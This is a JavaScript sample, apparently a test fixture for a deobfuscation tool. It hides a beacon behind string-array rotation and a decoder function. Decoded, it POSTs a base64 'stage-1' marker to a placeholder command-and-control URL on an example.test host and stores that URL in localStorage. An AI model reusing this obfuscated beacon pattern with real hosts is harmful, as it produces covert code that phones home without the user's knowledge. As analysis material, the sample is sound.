// Classic string-array obfuscation with a rotation IIFE, hex escapes and a
// decoder function. Restoration should turn this into readable code.
(function () {
  // Stored pre-rotation; the IIFE rotates left twice, so indexes 0..5 resolve
  // to 'https://', 'c2', '.example', '.test', '/gate', 'POST'.
  var _0x4f2a = [
    '/gate',
    'POST',
    'https://',
    'c2',
    '.example',
    '.test'
  ];
  (function (array, count) {
    while (count--) array.push(array.shift());
  })(_0x4f2a, 2);
  function _0xd(index) {
    return _0x4f2a[index];
  }
  var endpoint = _0xd(0) + _0xd(1) + _0xd(2) + _0xd(3) + _0xd(4);
  console.log('endpoint', endpoint);
  try {
    fetch(endpoint, { method: _0xd(5), body: btoa('stage-1') });
  } catch (error) {
    console.log('network unavailable', error.message);
  }
  localStorage.setItem('endpoint', endpoint);
})();
